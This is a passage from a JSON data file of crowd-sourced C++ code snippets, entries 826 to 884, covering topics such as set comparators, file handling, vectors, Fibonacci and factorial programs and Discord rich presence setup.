laid out.       // For this introduction, we just print out \"Hello, Windows desktop!\"       // in the top left corner.       TextOut(hdc,          5, 5,          greeting, _tcslen(greeting));       // End application-specific layout section.        EndPaint(hWnd, &ps);       break;    case WM_DESTROY:       PostQuitMessage(0);       break;    default:       return DefWindowProc(hWnd, message, wParam, lParam);       break;    }     return 0; } \nHWND hwnd = CreateWindowEx(     0,                              // Optional window styles.     CLASS_NAME,                     // Window class     L\"Learn to Program Windows\",    // Window text     WS_OVERLAPPEDWINDOW,            // Window style      // Size and position     CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,      NULL,       // Parent window         NULL,       // Menu     hInstance,  // Instance handle     NULL        // Additional application data     );  if (hwnd == NULL) {     return 0; } \n",
    "reg_date": "2021-10-12T11:37:53.000Z"
  },
  {
    "id": 826,
    "keyword": null,
    "link": null,
    "title": " c++ custom comparator for elements in set",
    "description": "struct compare {     bool operator() (const int& x, const int& y) const {         return x<y; // if x<y then x will come before y. Change this condition as per requirement     } }; int main() {   set<int,compare> s; //use the comparator like this }\n",
    "reg_date": "2021-10-12T11:37:53.000Z"
  },
  {
    "id": 827,
    "keyword": null,
    "link": null,
    "title": " c++ custom compare in set",
    "description": "struct compare {     bool operator() (const int& x, const int& y) const {         return x<y; // if x<y then x will come before y. Change this condition as per requirement     } }; int main() {   set<int,compare> s; //use the comparator like this }\n",
    "reg_date": "2021-10-12T11:37:53.000Z"
  },
  {
    "id": 828,
    "keyword": null,
    "link": null,
    "title": " c++ custom namespace",
    "description": "//using namespaces using namespace std;  //creating namespaces namespace custom{   class example{     public:     \tstatic int method(){           return 0;         }   }; };  //using custom namespaces using namespace custom;\n",
    "reg_date": "2021-10-12T11:37:53.000Z"
  },
  {
    "id": 829,
    "keyword": null,
    "link": null,
    "title": " c++ date time",
    "description": "#include <iostream> #include <ctime>  using namespace std;  int main() {    // current date/time based on current system    time_t now = time(0);     cout << \"Number of sec since January 1,1970 is:: \" << now << endl;     tm *ltm = localtime(&now);     // print various components of tm structure.    cout << \"Year:\" << 1900 + ltm->tm_year<<endl;    cout << \"Month: \"<< 1 + ltm->tm_mon<< endl;    cout << \"Day: \"<< ltm->tm_mday << endl;    cout << \"Time: \"<< 5+ltm->tm_hour << \":\";    cout << 30+ltm->tm_min << \":\";    cout << ltm->tm_sec << endl; }\n",
    "reg_date": "2021-10-12T11:37:53.000Z"
  },
  {
    "id": 830,
    "keyword": null,
    "link": null,
    "title": " c++ debug memory allocation",
    "description": "// use valgrind for linux // use -fmudflap -lmudflap options with gcc, then start your program with MUDFLAP_OPTIONS=-print-leaks ./my_program.  template<typename T> struct track_alloc : std::allocator<T> {     typedef typename std::allocator<T>::pointer pointer;     typedef typename std::allocator<T>::size_type size_type;      template<typename U>     struct rebind {         typedef track_alloc<U> other;     };      track_alloc() {}      template<typename U>     track_alloc(track_alloc<U> const& u)         :std::allocator<T>(u) {}      pointer allocate(size_type size,                       std::allocator<void>::const_pointer = 0) {         void * p = std::malloc(size * sizeof(T));         if(p == 0) {             throw std::bad_alloc();         }         return static_cast<pointer>(p);     }      void deallocate(pointer p, size_type) {         std::free(p);     } };  typedef std::map< void*, std::size_t, std::less<void*>,                    track_alloc< std::pair<void* const, std::size_t> > > track_type;  struct track_printer {     track_type * track;     track_printer(track_type * track):track(track) {}     ~track_printer() {         track_type::const_iterator it = track->begin();         while(it != track->end()) {             std::cerr << \"TRACK: leaked at \" << it->first << \", \"                       << it->second << \" bytes\\n\";             ++it;         }     } };  track_type * get_map() {     // don't use normal new to avoid infinite recursion.     static track_type * track = new (std::malloc(sizeof *track))          track_type;     static track_printer printer(track);     return track; }  void * operator new(std::size_t size) throw(std::bad_alloc) {     // we are required to return non-null     void * mem = std::malloc(size == 0 ? 1 : size);     if(mem == 0) {         throw std::bad_alloc();     }     (*get_map())[mem] = size;     return mem; }  void operator delete(void * mem) throw() {     if(get_map()->erase(mem) == 0) {         // this indicates a serious bug         std::cerr << \"bug: memory at \"                    << mem << \" wasn't allocated by us\\n\";     }     std::free(mem); }  int main() {     std::string *s = new std::string;         // will print something like: TRACK: leaked at 0x9564008, 4 bytes }\n",
    "reg_date": "2021-10-12T11:37:53.000Z"
  },
  {
    "id": 831,
    "keyword": null,
    "link": null,
    "title": " c++ declare char",
    "description": "// syntax:  // char <variable-name>[] = \"<string/char-you-want-to-store>\";   // example (to store 'Hello!' in the YourVar variable):  char YourVar[] = \"Hello!\"; \n // syntax:  // char <variable-name>[] = { '<1st-char>',  '<2nd-char>', ... , '<Nth-char>', '\\0'};   // example (to store 'Hello' in the YourVar variable):  char YourVar[] = {'H','e','l','l','o','\\0'}; // NOTE: the \\0 marks the end of the char array \n",
    "reg_date": "2021-10-12T11:37:54.000Z"
  },
  {
    "id": 832,
    "keyword": null,
    "link": null,
    "title": " c++ declare variable",
    "description": "std::string str = \"text\";\t// stores a string int    foo = 3;\t\t\t\t// stores any integer float  bar = 3.14;\t\t\t// stores 32 bit number double baz = 3.14159265;\t// stores 64 bit number\n// operating with variables  #include <iostream> using namespace std;  int main () {   // declaring variables:   int a, b;   int result;    // process:   a = 5;   b = 2;   a = a + 1;   result = a - b;    // print out the result:   cout << result;    // terminate the program:   return 0; }\n",
    "reg_date": "2021-10-12T11:37:54.000Z"
  },
  {
    "id": 833,
    "keyword": null,
    "link": null,
    "title": " c++ default array value not null",
    "description": "// https://stackoverflow.com/questions/19233050/why-is-my-empty-array-not-empty  int array[12] = {}; \n",
    "reg_date": "2021-10-12T11:37:54.000Z"
  },
  {
    "id": 834,
    "keyword": null,
    "link": null,
    "title": " c++ default constructor remove",
    "description": "class A { public:     A() = delete; };\n",
    "reg_date": "2021-10-12T11:37:54.000Z"
  },
  {
    "id": 835,
    "keyword": null,
    "link": null,
    "title": " c++ define vector with size",
    "description": "vector<vector<int>> v(10, vector<int>(10));\n#include <vector>  int main() {   std::vector<int> myVector = { 666, 1337, 420 };      size_t size = myVector.size(); // 3      myVector.push_back(399); // Add 399 to the end of the vector      size = myVector.size(); // 4 }\n#include <iostream> #include <vector>  using namespace std;  int main(void) {    vector<int> v;     cout << \"Initial vector size = \" << v.size() << endl;     v.resize(5, 10);    cout << \"Vector size after resize = \" << v.size() << endl;     cout << \"Vector contains following elements\" << endl;    for (int i = 0; i < v.size(); ++i)       cout << v[i] << endl;     return 0; }\n// create a vector with 20 integer elements std::vector<int> arr(20);  for(int x = 0; x < 20; ++x)    arr[x] = x;\n#include <vector>  auto n = 20 // create a vector with n=20 integer elements std::vector<int> arr(n);\nvector<Entry> array(1000);//size of 1000 \n",
    "reg_date": "2021-10-12T11:37:54.000Z"
  },
  {
    "id": 836,
    "keyword": null,
    "link": null,
    "title": " c++ delet from memory",
    "description": "// Delete pointer int* ptr1 = new int; delete ptr1;  // Delete array int* array = new int[10]; delete[] array;  \n",
    "reg_date": "2021-10-12T11:37:54.000Z"
  },
  {
    "id": 837,
    "keyword": null,
    "link": null,
    "title": " c++ delete directory",
    "description": "#include <filesystem> std::filesystem::remove(\"myEmptyDirectoryOrFile\"); // Deletes empty directories or single files. std::filesystem::remove_all(\"myDirectory\"); // Deletes one or more files recursively.\n",
    "reg_date": "2021-10-12T11:37:54.000Z"
  },
  {
    "id": 838,
    "keyword": null,
    "link": null,
    "title": " c++ delete dynamically allocated array",
    "description": "int length = 69; int * numbers = new int[length]; delete[] numbers;\n",
    "reg_date": "2021-10-12T11:37:54.000Z"
  },
  {
    "id": 839,
    "keyword": null,
    "link": null,
    "title": " c++ delete printed characters",
    "description": "cout<<\"\\b\";\n",
    "reg_date": "2021-10-12T11:37:55.000Z"
  },
  {
    "id": 840,
    "keyword": null,
    "link": null,
    "title": " c++ dereference a pointer",
    "description": "int number; int value; int * pNumber;  number = 5; pNumber = &number;  assert(pNumber); // check before dereferenceing to prevent errors value = *pNumber // Use * to dereference the pointer\n",
    "reg_date": "2021-10-12T11:37:55.000Z"
  },
  {
    "id": 841,
    "keyword": null,
    "link": null,
    "title": " c++ descending sort",
    "description": "sort(arr, arr + n, greater<int>());\n",
    "reg_date": "2021-10-12T11:37:55.000Z"
  },
  {
    "id": 842,
    "keyword": null,
    "link": null,
    "title": " c++ dev/null",
    "description": "#include <iostream>  void foo() {     std::cout << \"Boring message. \" << std::endl; }  int main() {     std::cout.setstate(std::ios::failbit) ;     foo();     std::cout.clear() ;     std::cout << \"Interesting message.\" << std::endl;     return 0; } \n",
    "reg_date": "2021-10-12T11:37:55.000Z"
  },
  {
    "id": 843,
    "keyword": null,
    "link": null,
    "title": " c++ directory listing",
    "description": "#include <string> #include <iostream> #include <filesystem> namespace fs = std::filesystem;  int main() {     std::string path = \"/path/to/directory\";     for (const auto & entry : fs::directory_iterator(path))         std::cout << entry.path() << std::endl; } \n",
    "reg_date": "2021-10-12T11:37:55.000Z"
  },
  {
    "id": 844,
    "keyword": null,
    "link": null,
    "title": " c++ discord rich presence",
    "description": "/* Anwser from greper Made by Mega145 query: c++ discord rich presence */  /* Download instructions: https://github.com/discord/discord-rpc/releases choose release for your OS for windows i reccomend using win32 static from the include folder get both .h files and from the lib folder get the .lib file add the lib to ur project */  //Code #include \"discord_rpc.h\" // Required but we wont get indepth static void handleDiscordReady(const DiscordUser* connectedUser) { }  static void handleDiscordDisconnected(int errcode, const char* message) { }  static void handleDiscordError(int errcode, const char* message) { }  static void handleDiscordJoin(const char* secret) { }  static void handleDiscordSpectate(const char* secret) { }  static void handleDiscordJoinRequest(const DiscordUser* request) { } // //                          V Get it here: https://discord.com/developers/applications static const char* ID = \"YOUR APP ID\"; DiscordRichPresence discordPresence; DiscordEventHandlers handlers; memset(&handlers, 0, sizeof(handlers)); handlers.ready = handleDiscordReady; handlers.disconnected = handleDiscordDisconnected; handlers.errored = handleDiscordError; handlers.joinGame = handleDiscordJoin; handlers.spectateGame = handleDiscordSpectate; handlers.joinRequest = handleDiscordJoinRequest; Discord_Initialize(ID, &handlers, 1, NULL);  // Update presence:  memset(&discordPresence, 0, sizeof(discordPresence)); //REQUIRED discordPresence.state = \"State\";      //REQUIRED discordPresence.details = \"DETAILS\";  //REQUIRED discordPresence.startTimestamp = 1507665886; discordPresence.endTimestamp = 1507665886; discordPresence.largeImageKey = \"Large ImageKey\" discordPresence.largeImageText = \"Large ImageText\"; discordPresence.smallImageKey = \"Small image key\" discordPresence.smallImageText = \"Small image text\"; discordPresence.partyId = \"party-id\"; discordPresence.partySize = 1; discordPresence.partyMax = 2; discordPresence.joinSecret = \"join-secret\"; Discord_UpdatePresence(&discordPresence); //REQUIRED \n",
    "reg_date": "2021-10-12T11:37:55.000Z"
  },
  {
    "id": 845,
    "keyword": null,
    "link": null,
    "title": " c++ display numbers as binary",
    "description": "#include <bitset> ...  char a = -58;     std::bitset<8> x(a); std::cout << x << '\\n';  short c = -315; std::bitset<16> y(c); std::cout << y << '\\n';\n#include <iostream> #include <bitset>  int main() {     int a = -58, b = a>>3, c = -315;      std::cout << \"a = \" << std::bitset<8>(a)  << std::endl;     std::cout << \"b = \" << std::bitset<8>(b)  << std::endl;     std::cout << \"c = \" << std::bitset<16>(c) << std::endl; } \n",
    "reg_date": "2021-10-12T11:37:55.000Z"
  },
  {
    "id": 846,
    "keyword": null,
    "link": null,
    "title": " c++ dll exports",
    "description": "#ifdef LIBRARY_EXPORTS #    define LIBRARY_API __declspec(dllexport) #else #    define LIBRARY_API __declspec(dllimport) #endif \n",
    "reg_date": "2021-10-12T11:37:55.000Z"
  },
  {
    "id": 847,
    "keyword": null,
    "link": null,
    "title": " c++ do every 1 minutes",
    "description": "#include <thread> #include <chrono>  int main() {    while (true) {     std::this_thread::sleep_for(std::chrono::seconds(60));     // call your c++ code   }  } \n",
    "reg_date": "2021-10-12T11:37:55.000Z"
  },
  {
    "id": 848,
    "keyword": null,
    "link": null,
    "title": " c++ do while loop",
    "description": "do {    // codes; } while (testExpression);\nwhile (x != 0){ ... }\ndo {    statement(s); } while(condition);\n",
    "reg_date": "2021-10-12T11:37:55.000Z"
  },
  {
    "id": 849,
    "keyword": null,
    "link": null,
    "title": " c++ do you not inherit constructor",
    "description": "class A {     public:          explicit A(int x) {} };  class B: public A {      using A::A; };\n",
    "reg_date": "2021-10-12T11:37:56.000Z"
  },
  {
    "id": 850,
    "keyword": null,
    "link": null,
    "title": " c++ does not name a type",
    "description": "could be caused by circular includes\n",
    "reg_date": "2021-10-12T11:37:56.000Z"
  },
  {
    "id": 851,
    "keyword": null,
    "link": null,
    "title": " c++ double higher precision then float",
    "description": "For representing floating point numbers, we use float, double and long double.  What&rsquo;s the difference ?  double has 2x more precision then float.  float is a 32 bit IEEE 754 single precision Floating Point Number1 bit for the sign, (8 bits for the exponent, and 23* for the value), i.e. float has 7 decimal digits of precision.  double is a 64 bit IEEE 754 double precision Floating Point Number (1 bit for the sign, 11 bits for the exponent, and 52* bits for the value), i.e. double has 15 decimal digits of precision.\n",
    "reg_date": "2021-10-12T11:37:56.000Z"
  },
  {
    "id": 852,
    "keyword": null,
    "link": null,
    "title": " c++ double is nan",
    "description": "/* isnan example */ #include <stdio.h>      /* printf */ #include <math.h>       /* isnan, sqrt */  int main() {   printf (\"isnan(0.0)       : %d\\n\",isnan(0.0));   printf (\"isnan(1.0/0.0)   : %d\\n\",isnan(1.0/0.0));   printf (\"isnan(-1.0/0.0)  : %d\\n\",isnan(-1.0/0.0));   printf (\"isnan(sqrt(-1.0)): %d\\n\",isnan(sqrt(-1.0)));   return 0; }\n",
    "reg_date": "2021-10-12T11:37:56.000Z"
  },
  {
    "id": 853,
    "keyword": null,
    "link": null,
    "title": " c++ drawing rectangle",
    "description": "draw_rect(float x, float y, float half_size_x, float half_size_y, u32 color) { \tx *= rs.height * render_scale; \ty *= rs.height * render_scale; \thalf_size_x *= rs.height * render_scale; \thalf_size_y *= rs.height * render_scale; \tx += rs.width / 2.f; \ty += rs.height / 2.f; \t// Change to pixels \tint x0 = x - half_size_x; \tint x1 = x + half_size_x; \tint y0 = y - half_size_y; \tint y1 = y + half_size_y; \tdraw_rect_in_pixels(x0, y0, x1, y1, color); }\n",
    "reg_date": "2021-10-12T11:37:56.000Z"
  },
  {
    "id": 854,
    "keyword": null,
    "link": null,
    "title": " c++ dynamic memory allocation exercises",
    "description": "#include <iostream> using namespace std;  int main () {    double* pvalue  = NULL; // Pointer initialized with null    pvalue  = new double;   // Request memory for the variable      *pvalue = 29494.99;     // Store value at allocated address    cout << \"Value of pvalue : \" << *pvalue << endl;     delete pvalue;         // free up the memory.     return 0; }\n#include <iostream>  int main() { \tint *ptr = new int; \t*ptr = 4; \tstd::cout << *ptr << std::endl; \treturn 0; } \n",
    "reg_date": "2021-10-12T11:37:56.000Z"
  },
  {
    "id": 855,
    "keyword": null,
    "link": null,
    "title": " c++ empty stream",
    "description": " // headers #include <sstream>  // syntax <stringstream-name>.clear(); <stringstream-name>.str();  // example ostringstream oTestStrm; oTestStrm << \"Hello World!\"; oTestStrm.clear(); oTestStrm.str(\"\"); \n",
    "reg_date": "2021-10-12T11:37:56.000Z"
  },
  {
    "id": 856,
    "keyword": null,
    "link": null,
    "title": " c++ enable visual styles",
    "description": "#pragma comment(linker,\"\\\"/manifestdependency:type='win32' \\ name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \\ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\\\"\") \n",
    "reg_date": "2021-10-12T11:37:56.000Z"
  },
  {
    "id": 857,
    "keyword": null,
    "link": null,
    "title": " c++ endl",
    "description": "// endl example #include <iostream>     // std::cout, std::end using namespace std; int main () {    int a=100;   double b=3.14;    cout << a;   cout << endl;              // manipulator inserted alone   cout << b << endl << a*b;  // manipulator in concatenated insertion   endl (cout);               // endl called as a regular function    return 0; }\n#include <iostream> #include <chrono>   template<typename Diff> void log_progress(Diff d) {     std::cout << std::chrono::duration_cast<std::chrono::milliseconds>(d).count()               << \" ms passed\" << std::endl; }   int main() {     std::cout.sync_with_stdio(false); // on some platforms, stdout flushes on \\n     volatile int sink = 0;       auto t1 = std::chrono::high_resolution_clock::now();     for (int j=0; j<5; ++j)     {         for (int n=0; n<10000; ++n)             for (int m=0; m<20000; ++m)                 sink += m*n; // do some work         auto now = std::chrono::high_resolution_clock::now();         log_progress(now - t1);     } }\ncout << \"Hello \" << '\\n'<<\"world\"; cout << \"Hello \" << endl<<\"world\"; //Hello   //world \n",
    "reg_date": "2021-10-12T11:37:56.000Z"
  },
  {
    "id": 858,
    "keyword": null,
    "link": null,
    "title": " c++ endswith",
    "description": "#include <iostream> using namespace std;  inline bool endsWith(string const &value, string const &ending) {     if (ending.size() > value.size()) return false;     return equal(ending.rbegin(), ending.rend(), value.rbegin()); }  int main() { \tstring teststring = \"This should return true because the string ends with a period.\";     string ending = \".\";        \tcout << endsWith(teststring, ending);       }\n",
    "reg_date": "2021-10-12T11:37:56.000Z"
  },
  {
    "id": 859,
    "keyword": null,
    "link": null,
    "title": " c++ enter name and surname one string",
    "description": "cout<<\"Enter name\"<<endl; //includes surname getline(cin, name); // assum name is std::string  cin.getline(name, sizeof(name)); // assumes name is a character array\n",
    "reg_date": "2021-10-12T11:37:57.000Z"
  },
  {
    "id": 860,
    "keyword": null,
    "link": null,
    "title": " c++ enum rand",
    "description": "enum Color {Red, Green, Blue}; Color color = Color(rand()%3);\n",
    "reg_date": "2021-10-12T11:37:57.000Z"
  },
  {
    "id": 861,
    "keyword": null,
    "link": null,
    "title": " c++ enum to string",
    "description": "//There really is no beautiful way of doing this. //Just set up an array of strings indexed by the enum. //If you do a lot of output, you can define an operator<< that- //-takes an enum parameter and does the lookup for you.\n",
    "reg_date": "2021-10-12T11:37:57.000Z"
  },
  {
    "id": 862,
    "keyword": null,
    "link": null,
    "title": " c++ erase(remove if)",
    "description": "class Anything{ public:\tint func() };  list<Anything> lst = <some_elements>;  //removes every element in list that returned true in line 9 lst.erase(std::remove_if(lst.begin(), lst.end(),                        [&](const Anything lst)-> bool                        { return lst.func() == something; }), //any condition         lst.end());\n",
    "reg_date": "2021-10-12T11:37:57.000Z"
  },
  {
    "id": 863,
    "keyword": null,
    "link": null,
    "title": " c++ erase last element of set",
    "description": "st.erase(*st.rbegin()); // or st.erase(prev(st.end()));\n",
    "reg_date": "2021-10-12T11:37:57.000Z"
  },
  {
    "id": 864,
    "keyword": null,
    "link": null,
    "title": " c++ erase remove",
    "description": "std::vector<int> v = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9}; v.erase(std::remove(v.begin(), v.end(), 5), v.end()); // v will be {0 1 2 3 4 6 7 8 9}\n",
    "reg_date": "2021-10-12T11:37:57.000Z"
  },
  {
    "id": 865,
    "keyword": null,
    "link": null,
    "title": " c++ erase substring",
    "description": "using namespace std;  string BasicString = \"I dont like erasing strings\"; string StrToErase = \" dont\";  string::size_type i = BasicString.find(StrToErase);  if (i != string::npos) {    BasicString.erase(i, StrToErase.length());  }  cout << BasicString << \"\\n\"; // OUTPUT: I like erasing strings \n string& erase (size_t pos = 0, size_t len = npos); /* pos Position of the first character to be erased. If this is greater than the string length, it throws out_of_range. Note: The first character in str is denoted by a value of 0 (not 1). len Number of characters to erase (if the string is shorter, as many characters as possible are erased). A value of string::npos indicates all characters until the end of the string. */\n",
    "reg_date": "2021-10-12T11:37:57.000Z"
  },
  {
    "id": 866,
    "keyword": null,
    "link": null,
    "title": " c++ evaluate expression",
    "description": "#include \"tinyexpr.h\" #include <stdio.h>  int main() {     double answer = te_interp(\"3*2+4*1+(4+9)*6\", 0);     printf(\"Answer is %f\\n\", answer);     return 0; }\n",
    "reg_date": "2021-10-12T11:37:57.000Z"
  },
  {
    "id": 867,
    "keyword": null,
    "link": null,
    "title": " c++ even odd",
    "description": "#include <iostream> using namespace std;  int main() {     int n;      cout << \"Enter an integer: \";     cin >> n;      if ( n % 2 == 0)         cout << n << \" is even.\";     else         cout << n << \" is odd.\";      return 0; } \n",
    "reg_date": "2021-10-12T11:37:57.000Z"
  },
  {
    "id": 868,
    "keyword": null,
    "link": null,
    "title": " c++ example",
    "description": "// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \n// C++ Hello World program #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; }\n#include<iostream.h> #include<conio.h> void main() { \tclrscr();  // clear the screen \tcout<<\"Hello Compiler, I am C++\"; \tgetch();  // holds output screen until user press a key }\n",
    "reg_date": "2021-10-12T11:37:57.000Z"
  },
  {
    "id": 869,
    "keyword": null,
    "link": null,
    "title": " c++ extend class",
    "description": "//Declare that Foo publicly extend Bar class Foo : public Bar{} \nclass Animal {   public:        move(); }  class Dog: public Animal { \tpublic:  \t\tmove(); };\n",
    "reg_date": "2021-10-12T11:37:58.000Z"
  },
  {
    "id": 870,
    "keyword": null,
    "link": null,
    "title": " c++ factorial",
    "description": "#include<bits/stdc++.h> #include<stdio.h> using namespace std;  int fact(int i){ \tif (i <= 1) return 1;   \telse return i*fact(i-1); }  int main(){   \tios::sync_with_stdio(0);   \tcin.tie(0);   \tint N;   \tcin >> N;   \tcout << fact(N) << \"\\n\";   \treturn 0; }\n#include <iostream> using namespace std;  int main() {     unsigned int n;     unsigned long long factorial = 1;      cout << \"Enter a positive integer: \";     cin >> n;      for(int i = 1; i <=n; ++i)     {         factorial *= i;     }      cout << \"Factorial of \" << n << \" = \" << factorial;         return 0; }\n#include <cmath>  int fact(int n){     return std::tgamma(n + 1);   }     // for n = 5 -> 5 * 4 * 3 * 2 = 120  //tgamma performas factorial with n - 1 -> hence we use n + 1\n#include <iostream>using namespace std;void factorial (int x);int main (){    int number;     int fact =1;    for (int i=1;i<=number;i++)    {        fact=fact*i;    }    cout <<\"fact\"<<number<<\"is \"<<fact;    return 0;}\n",
    "reg_date": "2021-10-12T11:37:58.000Z"
  },
  {
    "id": 871,
    "keyword": null,
    "link": null,
    "title": " c++ fast",
    "description": "#include <bits/stdc++.h> using namespace std;  int main() {     ios_base::sync_with_stdio(false);     cin.tie(NULL);   \tcout.tie(NULL);     return 0; } \n#include <bits/stdc++.h> using namespace std; #define fast ios_base::sync_with_stdio(false);cin.tie(NULL);cout.tie(NULL) int main() {     fast;     return 0; }\n",
    "reg_date": "2021-10-12T11:37:58.000Z"
  },
  {
    "id": 872,
    "keyword": null,
    "link": null,
    "title": " c++ fast i/o",
    "description": "#include <bits/stdc++.h> using namespace std;  int main() {     ios_base::sync_with_stdio(false);     cin.tie(NULL);   \tcout.tie(NULL);     return 0; } \n",
    "reg_date": "2021-10-12T11:37:58.000Z"
  },
  {
    "id": 873,
    "keyword": null,
    "link": null,
    "title": " c++ fibonacci",
    "description": "#include <iostream> using namespace std;  int main(){ \tint a{0},b{1},count{},c{}; \tcin >> count; \tfor (int i = 0; i < count; ++i) \t{ \t\tcout << a << endl; \t\tc = b; \t\tb = a + b; \t\ta = c; \t} }\n#include <iostream> using namespace std;  int main () {     int num1, num2, num3, input;      num1 = 0;     num2 = 1;     cout << \"How many nums in sequence do you want to see: \";      cin >> input;      cout << num1 << \" \" << num2 << \" \";       for(int i = 2; i < input; i++) // runs through every element but first two      {         num3 = num1 + num2;          cout << num3 << \" \";          num1 = num2;          num2 = num3;      }          return 0; }\n#include<iostream> using namespace std; int main() {     int num,num1=0,num2=1,num3,i=0;     cout<<\"enter the number num\"<<endl;     cin>>num;     for(i=1;i<=num;i++)     {         num3=num1+num2;         num1=num2;         num2=num3;         cout<<num3<<endl;     }  } \n//dp ;Bottom up approach #include <iostream>  using namespace std; int fib(int n) {     int fib[n+1];     fib[0]=0;     fib[1]=1;     for(int i=2;i<=n;i++)     {         fib[i]=fib[i-1]+fib[i-2];     }     return fib[n]; }  int main() {     int n;     cout<<\"enter the value whose fibonaaci value you want to claculate:\"<<endl;     cin>>n;     if(n<=1)     {         cout<<\"fib is: \"<<n<<endl;     }     else     {         cout<<\"fib is: \"<<fib(n)<<endl;     }     return 0; } \n#include <iostream> using namespace std;  int main() {     int n, t1 = 0, t2 = 1, nextTerm = 0;      cout << \"Enter the number of terms: \";     cin >> n;      cout << \"Fibonacci Series: \";      for (int i = 1; i <= n; ++i)     {         // Prints the first two terms.         if(i == 1)         {             cout << \" \" << t1;             continue;         }         if(i == 2)         {             cout << t2 << \" \";             continue;         }         nextTerm = t1 + t2;         t1 = t2;         t2 = nextTerm;                  cout << nextTerm << \" \";     }     return 0; } \n",
    "reg_date": "2021-10-12T11:37:58.000Z"
  },
  {
    "id": 874,
    "keyword": null,
    "link": null,
    "title": " c++ file handiling",
    "description": " Welcome to javaTpoint. C++ Tutorial. \n",
    "reg_date": "2021-10-12T11:37:58.000Z"
  },
  {
    "id": 875,
    "keyword": null,
    "link": null,
    "title": " c++ file name without extension",
    "description": "// The GetFilenameExcludingExtension function does the trick. Just make sure it is defined below the GetFileExtension function  #include <iostream> using namespace std;  string GetFileExtension(string Filename) {    size_t LastDot = Filename.find_last_of(\".\");     if (LastDot == string::npos)    {       return \"\"; // No extension in Filename string    }     return Filename.substr(LastDot); }  string GetFilenameExcludingExtension(string Filename) {    string Extension = GetFileExtension(Filename);    string NameExclExt = Filename.substr(0,Filename.length() - Extension.length());     return NameExclExt; } \n",
    "reg_date": "2021-10-12T11:37:58.000Z"
  },
  {
    "id": 876,
    "keyword": null,
    "link": null,
    "title": " c++ file to string",
    "description": "#include <fstream> #include <string> using namespace std;  int main() {   ifstream ifs(\"myfile.txt\");   //Two ways:      //Assign it at initialization   string content( (istreambuf_iterator<char>(ifs) ),                   (istreambuf_iterator<char>()    ) );      //Assign it after initialization   content.assign( (istreambuf_iterator<char>(ifs) ),                   (istreambuf_iterator<char>()    ) );   return 0; }\nstring filetostring(){ \tifstream file(\"file\", ios::binary);     string fileStr;      istreambuf_iterator<char> inputIt(file), emptyInputIt;     back_insert_iterator<string> stringInsert(fileStr);      copy(inputIt, emptyInputIt, stringInsert);      return fileStr; }\n",
    "reg_date": "2021-10-12T11:37:58.000Z"
  },
  {
    "id": 877,
    "keyword": null,
    "link": null,
    "title": " c++ filename from path",
    "description": "// get filename std::string base_filename = full_path.substr(full_path.find_last_of(\"/\\\\\") + 1);  // remove extension from filename std::string::size_type const p(base_filename.find_last_of('.')); std::string file_without_extension = base_filename.substr(0, p);\n// The GetFilenameFromFullpath function does the job  #include <iostream> using namespace std;  string GetFilenameFromFullpath(string Filepath, bool IncludeExtension) {     // Remove folder path     string Filename = Filepath.substr(Filepath.find_last_of(\"/\\\\\") + 1);      if (IncludeExtension == false)     {         // Remove extension         string Extension = GetFileExtension(Filename);         Filename = Filename.substr(0,Filename.length() - Extension.length());     }          return Filename; }  string GetFileExtension(string Filename) {    size_t LastDot = Filename.find_last_of(\".\");     if (LastDot == string::npos)    {       return \"\"; // No extension in Filename string    }     return Filename.substr(LastDot); }\n",
    "reg_date": "2021-10-12T11:37:58.000Z"
  },
  {
    "id": 878,
    "keyword": null,
    "link": null,
    "title": " c++ files",
    "description": "// basic file operations #include <iostream> #include <fstream> using namespace std;  int main () {   ofstream myfile;   myfile.open (\"example.txt\");   myfile << \"Writing this to a file.\\n\";   myfile.close();   return 0; }\n// io/read-file-sum.cpp - Read integers from file and print sum. // Fred Swartz 2003-08-20  #include <iostream> #include <iomanip> #include <fstream> using namespace std;  int main() {     int sum = 0;     int x;     ifstream inFile;          inFile.open(\"test.txt\");     if (!inFile) {         cout << \"Unable to open file\";         exit(1); // terminate with error     }          while (inFile >> x) {         sum = sum + x;     }          inFile.close();     cout << \"Sum = \" << sum << endl;      return 0; } \n#include <fstream>  ifstream file_variable; //ifstream is for input from plain text files file_variable.open(\"input.txt\"); //open input.txt  file_variable.close(); //close the file stream /* Manually closing a stream is only necessary if you want to re-use the same stream variable for a different file, or want to switch from input to output on the same file. */ _____________________________________________________ //You can also use cin if you have tables like so: while (cin >> name >> value)// you can also use the file stream instead of this {  cout << name << value << endl; } _____________________________________________________ //ifstream file_variable; //ifstream is for input from plain text files ofstream out_file; out_file.open(\"output.txt\");  out_file << \"Write this scentence in the file\" << endl;\n",
    "reg_date": "2021-10-12T11:37:58.000Z"
  },
  {
    "id": 879,
    "keyword": null,
    "link": null,
    "title": " c++ filesystem read directory",
    "description": " std::string path = \"/path/to/directory\";     for (const auto & entry : fs::directory_iterator(path))         std::cout << entry.path() << std::endl;\n",
    "reg_date": "2021-10-12T11:37:59.000Z"
  },
  {
    "id": 880,
    "keyword": null,
    "link": null,
    "title": " c++ filesystem remove file",
    "description": "bool std::filesystem::remove(const std::filesystem::path& p);\n",
    "reg_date": "2021-10-12T11:37:59.000Z"
  },
  {
    "id": 881,
    "keyword": null,
    "link": null,
    "title": " c++ final class",
    "description": "const int x = 8; x = 10; // Error. x is final variable now\nstruct Base {     virtual void foo(); };   struct A : Base {     void foo() final; // Base::foo is overridden and A::foo is the final override     void bar() final; // Error: bar cannot be final as it is non-virtual };   struct B final : A // struct B is final {     void foo() override; // Error: foo cannot be overridden as it is final in A };   struct C : B // Error: B is final { };\n",
    "reg_date": "2021-10-12T11:37:59.000Z"
  },
  {
    "id": 882,
    "keyword": null,
    "link": null,
    "title": " c++ find element in set",
    "description": "// initialize set std::set<std::string> my_set({\"foo\", \"bar\"}); // find element in set my_set.find(\"foo\");\n",
    "reg_date": "2021-10-12T11:37:59.000Z"
  },
  {
    "id": 883,
    "keyword": null,
    "link": null,
    "title": " c++ find element in vector",
    "description": "#include <algorithm> #include <vector>  if ( std::find(vec.begin(), vec.end(), item) != vec.end() )    do_this(); else    do_that();\nauto it = find(vec.begin(),vec,end(), item)! if(it != vec.end()){  \t int index = it - vec.begin(); }\n",
    "reg_date": "2021-10-12T11:37:59.000Z"
  },
  {
    "id": 884,
    "keyword": null,
    "link": null,
    "title": " c++ find in pair",
